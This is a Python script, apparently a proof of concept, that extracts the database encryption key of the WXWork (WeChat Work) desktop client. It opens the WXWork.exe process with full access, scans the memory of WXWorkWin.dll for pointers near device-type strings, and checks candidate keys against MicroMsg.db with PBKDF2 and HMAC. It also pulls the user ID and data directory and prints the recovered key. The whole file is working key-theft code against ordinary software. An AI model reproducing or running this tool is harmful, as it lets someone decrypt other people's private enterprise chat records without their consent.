"""
企业微信(WXWork)数据库解密模块
基于个人微信解密逻辑改造，适配企业微信进程和DLL
"""
import os
import sys
import hmac
import hashlib
import ctypes
import winreg
import pymem
import pythoncom
from win32com.client import Dispatch
import psutil
import pymem.process

ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
void_p = ctypes.c_void_p


def get_exe_bit(file_path):
    """
    获取 PE 文件的位数: 32 位或 64 位
    :param file_path:  PE 文件路径(可执行文件)
    :return: 如果遇到错误则返回 64
    """
    try:
        with open(file_path, 'rb') as f:
            dos_header = f.read(2)
            if dos_header != b'MZ':
                print('get exe bit error: Invalid PE file')
                return 64
            f.seek(60)
            pe_offset_bytes = f.read(4)
            pe_offset = int.from_bytes(pe_offset_bytes, byteorder='little')
            f.seek(pe_offset + 4)
            machine_bytes = f.read(2)
            machine = int.from_bytes(machine_bytes, byteorder='little')

            if machine == 0x14c:
                return 32
            elif machine == 0x8664:
                return 64
            else:
                print('get exe bit error: Unknown architecture: %s' % hex(machine))
                return 64
    except IOError:
        print('get exe bit error: File not found or cannot be opened')
        return 64


def get_info_without_key(h_process, address, n_size=64):
    """读取内存中的字符串(非key部分)"""
    array = ctypes.create_string_buffer(n_size)
    if ReadProcessMemory(h_process, void_p(address), array, n_size, 0) == 0:
        return "None"
    array = bytes(array).split(b"\x00")[0] if b"\x00" in array else bytes(array)
    text = array.decode('utf-8', errors='ignore')
    return text.strip() if text.strip() != "" else "None"


def pattern_scan_all(handle, pattern, *, return_multiple=False, find_num=100):
    """扫描内存中的所有匹配模式"""
    next_region = 0
    found = []
    user_space_limit = 0x7FFFFFFF0000 if sys.maxsize > 2 ** 32 else 0x7fff0000
    while next_region < user_space_limit:
        try:
            next_region, page_found = pymem.pattern.scan_pattern_page(
                handle,
                next_region,
                pattern,
                return_multiple=return_multiple
            )
        except Exception as e:
            print(e)
            break
        if not return_multiple and page_found:
            return page_found
        if page_found:
            found += page_found
        if len(found) > find_num:
            break
    return found


def get_info_wxid(h_process):
    """从内存中提取企业微信ID"""
    find_num = 100
    # 企业微信可能使用不同的路径模式，先尝试类似个人微信的模式
    addrs = pattern_scan_all(h_process, br'\\Msg\\FTSContact', return_multiple=True, find_num=find_num)
    wxids = []
    for addr in addrs:
        array = ctypes.create_string_buffer(80)
        if ReadProcessMemory(h_process, void_p(addr - 30), array, 80, 0) == 0:
            return "None"
        array = bytes(array)
        array = array.split(b"\\Msg")[0]
        array = array.split(b"\\")[-1]
        wxids.append(array.decode('utf-8', errors='ignore'))
    wxid = max(wxids, key=wxids.count) if wxids else "None"
    return wxid


def get_wxwork_dir(wxid):
    """获取企业微信数据目录"""
    if not wxid:
        return ''
    try:
        # 企业微信数据目录通常在 %APPDATA%\Tencent\WXWork\
        appdata = os.environ.get("APPDATA")
        if not appdata:
            return ''

        # 尝试从注册表读取配置
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Tencent\WXWork", 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, "FileSavePath")
            winreg.CloseKey(key)
            wxwork_dir = value
        except Exception:
            # 使用默认路径
            wxwork_dir = os.path.join(appdata, "Tencent", "WXWork")

        # 企业微信可能使用不同的用户目录结构
        # 尝试查找包含wxid的目录
        if os.path.exists(wxwork_dir):
            for item in os.listdir(wxwork_dir):
                item_path = os.path.join(wxwork_dir, item)
                if os.path.isdir(item_path) and wxid in item:
                    return item_path

        # 如果找不到，返回默认路径
        msg_dir = os.path.join(wxwork_dir, wxid)
        return msg_dir
    except Exception as e:
        print(f"获取企业微信目录失败: {e}")
        return ''


def get_wxwork_key(db_path, addr_len):
    """从企业微信进程内存中提取数据库加密密钥"""
    def read_key_bytes(h_process, address, address_len=8):
        array = ctypes.create_string_buffer(address_len)
        if ReadProcessMemory(h_process, void_p(address), array, address_len, 0) == 0:
            return "None"
        address = int.from_bytes(array, byteorder='little')
        key = ctypes.create_string_buffer(32)
        if ReadProcessMemory(h_process, void_p(address), key, 32, 0) == 0:
            return "None"
        key_bytes = bytes(key)
        return key_bytes

    def verify_key(key, wx_db_path):
        """验证密钥是否正确"""
        if not wx_db_path or wx_db_path.lower() == "none":
            return True
        if not os.path.exists(wx_db_path):
            return False

        KEY_SIZE = 32
        DEFAULT_PAGESIZE = 4096
        DEFAULT_ITER = 64000

        try:
            with open(wx_db_path, "rb") as file:
                blist = file.read(5000)
            salt = blist[:16]
            byteKey = hashlib.pbkdf2_hmac("sha1", key, salt, DEFAULT_ITER, KEY_SIZE)
            first = blist[16:DEFAULT_PAGESIZE]

            mac_salt = bytes([(salt[i] ^ 58) for i in range(16)])
            mac_key = hashlib.pbkdf2_hmac("sha1", byteKey, mac_salt, 2, KEY_SIZE)
            hash_mac = hmac.new(mac_key, first[:-32], hashlib.sha1)
            hash_mac.update(b'\x01\x00\x00\x00')

            if hash_mac.digest() != first[-32:-12]:
                return False
            return True
        except Exception as e:
            print(f"验证密钥失败: {e}")
            return False

    phone_type1 = "iphone\x00"
    phone_type2 = "android\x00"
    phone_type3 = "ipad\x00"

    try:
        pm = pymem.Pymem("WXWork.exe")
        module_name = "WXWorkWin.dll"
    except Exception as e:
        print(f"无法打开企业微信进程: {e}")
        return "None"

    # 尝试查找可能的数据库文件
    MicroMsg_path = None
    if db_path and db_path != "None":
        possible_paths = [
            os.path.join(db_path, "MSG", "MicroMsg.db"),
            os.path.join(db_path, "Msg", "MicroMsg.db"),
            os.path.join(db_path, "MicroMsg.db"),
        ]
        for path in possible_paths:
            if os.path.exists(path):
                MicroMsg_path = path
                break

    try:
        type1_addrs = pm.pattern_scan_module(phone_type1.encode(), module_name, return_multiple=True)
        type2_addrs = pm.pattern_scan_module(phone_type2.encode(), module_name, return_multiple=True)
        type3_addrs = pm.pattern_scan_module(phone_type3.encode(), module_name, return_multiple=True)
    except Exception as e:
        print(f"模式扫描失败: {e}")
        return "None"

    type_addrs = type1_addrs if len(type1_addrs) >= 2 else type2_addrs if len(type2_addrs) >= 2 else type3_addrs if len(type3_addrs) >= 2 else "None"

    if type_addrs == "None":
        print("未找到设备类型标识")
        return "None"

    for i in type_addrs[::-1]:
        for j in range(i, i - 2000, -addr_len):
            key_bytes = read_key_bytes(pm.process_handle, j, addr_len)
            if key_bytes == "None":
                continue
            if MicroMsg_path and verify_key(key_bytes, MicroMsg_path):
                return key_bytes.hex()

    return "None"


def get_wxwork_info():
    """读取企业微信信息(wxid, name, account, key, version, wx_dir)"""
    result = []
    default_res = {
        'wxid': '',
        'name': '',
        'account': '',
        'key': '',
        'mobile': '',
        'version': '',
        'wx_dir': '',
        'errcode': 404,
        'errmsg': '错误！请登录企业微信。'
    }

    for process in psutil.process_iter(['name', 'exe', 'pid']):
        if process.name() == 'WXWork.exe':
            tmp_rd = {}
            pythoncom.CoInitialize()
            tmp_rd['pid'] = process.pid

            try:
                tmp_rd['version'] = Dispatch("Scripting.FileSystemObject").GetFileVersion(process.exe())
            except:
                tmp_rd['version'] = 'Unknown'

            # 检查是否有WXWorkWin.dll
            wechat_base_address = 0
            for module in process.memory_maps(grouped=False):
                if module.path and 'WXWorkWin.dll' in module.path:
                    wechat_base_address = int(module.addr, 16)
                    break

            if wechat_base_address == 0:
                default_res['errmsg'] = '错误！未找到WXWorkWin.dll模块。'
                return [default_res]

            Handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, process.pid)

            # 提取wxid
            tmp_rd['wxid'] = get_info_wxid(Handle)
            tmp_rd['wx_dir'] = get_wxwork_dir(tmp_rd['wxid']) if tmp_rd['wxid'] != "None" else "None"

            # 获取地址长度
            addrLen = get_exe_bit(process.exe()) // 8

            # 提取密钥
            tmp_rd['key'] = "None"
            tmp_rd['key'] = get_wxwork_key(tmp_rd['wx_dir'], addrLen)

            if tmp_rd['key'] == 'None':
                tmp_rd['errcode'] = 404
                tmp_rd['errmsg'] = '密钥提取失败，请重启企业微信后重试。'
            else:
                tmp_rd['errcode'] = 200
                tmp_rd['errmsg'] = '成功'

            # 企业微信可能没有这些字段，设置为默认值
            tmp_rd['account'] = "None"
            tmp_rd['mobile'] = "None"
            tmp_rd['name'] = "None"

            result.append(tmp_rd)

    if not result:
        return [default_res]

    return result


if __name__ == "__main__":
    print("=" * 60)
    print("企业微信数据库解密 POC")
    print("=" * 60)

    wxwork_info = get_wxwork_info()

    for info in wxwork_info:
        print(f"\n进程ID: {info.get('pid', 'N/A')}")
        print(f"版本: {info.get('version', 'N/A')}")
        print(f"企业微信ID: {info.get('wxid', 'N/A')}")
        print(f"数据目录: {info.get('wx_dir', 'N/A')}")
        print(f"密钥: {info.get('key', 'N/A')}")
        print(f"状态码: {info.get('errcode', 'N/A')}")
        print(f"消息: {info.get('errmsg', 'N/A')}")

    print("\n" + "=" * 60)
